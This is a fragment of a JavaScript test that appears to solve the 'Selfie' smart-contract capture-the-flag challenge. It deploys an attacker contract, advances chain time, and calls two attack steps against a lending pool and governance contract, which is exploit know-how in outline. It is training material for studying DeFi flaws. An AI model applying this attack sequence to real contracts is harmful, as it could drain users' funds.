...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const SelfieAttackerFactor = await ethers.getContractFactory("SelfieAttacker");
        this.attackingContract = await SelfieAttackerFactor.deploy(
            attacker.address,
            this.pool.address,
            this.governance.address
        )

        await this.token.connect(deployer)

        await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]); // 3 days

        await this.attackingContract.attack(TOKENS_IN_POOL)

        await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]); // 3 days

        await this.attackingContract.attack2()
    });
